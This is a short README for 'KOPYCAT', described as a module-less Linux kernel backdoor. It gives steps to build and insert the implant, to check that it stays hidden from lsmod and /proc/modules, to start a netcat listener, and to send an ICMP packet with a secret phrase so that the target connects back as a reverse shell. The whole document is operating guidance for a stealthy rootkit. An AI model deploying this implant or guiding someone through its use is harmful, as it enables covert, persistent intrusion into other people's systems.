# 0

KOPYCAT - Linux Kernel module-less implant (backdoor)

# Usage

~~~
$ make
$ make trigger
$ sudo insmod kopycat.ko
insmod: ERROR: could not insert module kopycat.ko: Inappropriate ioctl for device
$ lsmod | grep kopycat
$ cat /proc/modules | grep kopycat
~~~

Launch `nc` listener:
~~~
$ nc -l 8087
~~~

Trigger the backdoor by sending ICMP packet with secret phrase:
~~~
$ sudo ./trigger <target_ip> <reversed_ip> <reversed_port>
~~~

# Author

[Ilya V. Matveychikov](https://github.com/milabs)

2021
